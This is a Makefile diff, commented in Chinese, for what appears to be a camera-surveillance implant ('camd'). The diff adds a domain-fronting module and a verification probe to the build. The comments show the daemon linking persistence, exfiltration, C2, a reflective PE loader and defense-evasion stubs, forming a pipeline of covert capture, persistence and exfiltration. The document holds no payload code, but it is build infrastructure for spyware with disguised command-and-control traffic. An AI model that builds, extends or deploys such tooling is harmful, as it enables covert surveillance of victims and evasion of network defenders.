@@ -27,8 +27,9 @@ DAEMON_I := -I../09_persistence/include -I../21_exfil/include \
 # tls:// 出口需要自研 TLS 客户端的头文件。刻意不加进 DEP_I：DEP_I 作用于
 # 每一个测试二进制，而只有 camd 与 test_cam_daemon 链了 cam_daemon.o。
 TLS_I    := -I../25_tls/include -I../00_crypto/include
+FRONT_I  := -I../24_front/include
 CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I) $(DAEMON_I) \
-            $(TLS_I)
+            $(TLS_I) $(FRONT_I)
 CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
 LDLIBS   ?= -lm
 
@@ -98,6 +99,14 @@ TLS_SRCS := ../25_tls/src/bn.c ../25_tls/src/asn1.c ../25_tls/src/rsa.c \
             ../25_tls/src/x509.c ../25_tls/src/tls.c
 TLS_OBJS := $(TLS_SRCS:../25_tls/src/%.c=$(BUILD)/tls/%.o)
 
+# 域前置层。与 25_tls 同理由放子目录；crypto 依赖由 C2OBJS 提供，不重复链。
+FRONT_SRCS := ../24_front/src/front.c ../24_front/src/h2.c
+FRONT_OBJS := $(FRONT_SRCS:../24_front/src/%.c=$(BUILD)/front/%.o)
+
+# 域前置端到端守卫的服务端侧：它需要 25_tls 的**服务端**（camd 只链客户端）。
+TLS_SRV_OBJ  := $(BUILD)/tls/tls_server.o
+FRONT_PROBE  := $(BUILD)/front_probe
+
 # 上游产物不参与本 Makefile 的增量判断（它们由上游自己的 make 管），
 # 但必须声明为 order-only 依赖，否则首次构建时链接器可能拿到空/旧文件。
 DAEMON_DEPS := $(PERSIST_OBJ) $(EXFIL_OBJS) $(P2PLIB) $(C2OBJS) $(LATLIB)
@@ -157,6 +166,22 @@ $(BUILD)/tls/%.o: ../25_tls/src/%.c | dirs
 	@mkdir -p $(BUILD)/tls
 	$(CC) $(CFLAGS) -c $< -o $@
 
+# 前置节点观测器：站在真实 TLS 终结点上读 SNI 与解密后的 Host，用于断言
+# 域前置是否真的成立（仅靠客户端自证是假证明）。
+$(FRONT_PROBE): tests/front_probe.c $(TLS_OBJS) $(TLS_SRV_OBJ) $(C2OBJS) | dirs
+	$(CC) $(CFLAGS) -std=c11 $< $(TLS_OBJS) $(TLS_SRV_OBJ) $(C2OBJS) \
+	      -o $@ $(LDLIBS)
+
+.PHONY: verify-front
+verify-front: $(FRONT_PROBE) $(CAMDBIN)
+	@python3 tests/verify_front_sink.py
+
+# 24_front 按 c11 编写，本模块主目标是 c99——用后面的 -std=c11 覆盖，
+# 不去改全局 CFLAGS（那会改变其余文件的方言，风险面比这一处大得多）。
+$(BUILD)/front/%.o: ../24_front/src/%.c | dirs
+	@mkdir -p $(BUILD)/front
+	$(CC) $(CFLAGS) -std=c11 -c $< -o $@
+
 # 复用的外部模块目标文件（17_loader 的 PE 解析 / 19_defense 的桩字节）
 $(BUILD)/dep/loader_pe.o: ../17_loader/src/pe.c | dirs
 	@mkdir -p $(BUILD)/dep
@@ -207,12 +232,12 @@ $(BUILD)/test_v4l2_caps: tests/test_v4l2_caps.c src/cam_linux_v4l2.c \
 # cam_daemon 测试：显式规则，覆盖上面的通用模式规则。
 # 额外链入驻留 / 回传 / 信元三个上游模块，把「采集—驻留—回传」真正串起来。
 $(BUILD)/test_cam_daemon: tests/test_cam_daemon.c $(PORT_OBJS) $(DAEMON_OBJ) \
-                          $(DEP_OBJS) $(TLS_OBJS) $(BUILD)/synth_pe.o \
+                          $(DEP_OBJS) $(TLS_OBJS) $(FRONT_OBJS) $(BUILD)/synth_pe.o \
                           $(DAEMON_DEPS) | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(BUILD)/synth_pe.o \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
-	      $(TLS_OBJS) -o $@ $(LDLIBS)
+	      $(TLS_OBJS) $(FRONT_OBJS) -o $@ $(LDLIBS)
 
 # camd 部署入口：与 test_cam_daemon 同一套依赖，但不链 synth_pe.o（那是 PE
 # 合成构造器，只有反射加载类测试用得上），入口换成 cam_daemon_main.o。
@@ -220,10 +245,10 @@ $(CAMBIN_OBJ): src/cam_daemon_main.c include/cam_daemon.h include/camera.h | dir
 	$(CC) $(CFLAGS) -c $< -o $@
 
 $(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(TLS_OBJS) \
-            $(DAEMON_DEPS) | dirs upstream-deps
+            $(FRONT_OBJS) $(DAEMON_DEPS) | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
-	      $(TLS_OBJS) -o $@ $(LDLIBS)
+	      $(TLS_OBJS) $(FRONT_OBJS) -o $@ $(LDLIBS)
 
 test: $(TEST_BINS)
 	@fail=0; \
@@ -231,6 +256,8 @@ test: $(TEST_BINS)
 		echo "=== $$t ==="; \
 		./$$t || fail=1; \
 	done; \
+	echo "=== verify-front（域前置出口） ==="; \
+	python3 tests/verify_front_sink.py || fail=1; \
 	exit $$fail
 
 # Windows 后端：仅在检测到 MinGW 交叉工具链时真正编译
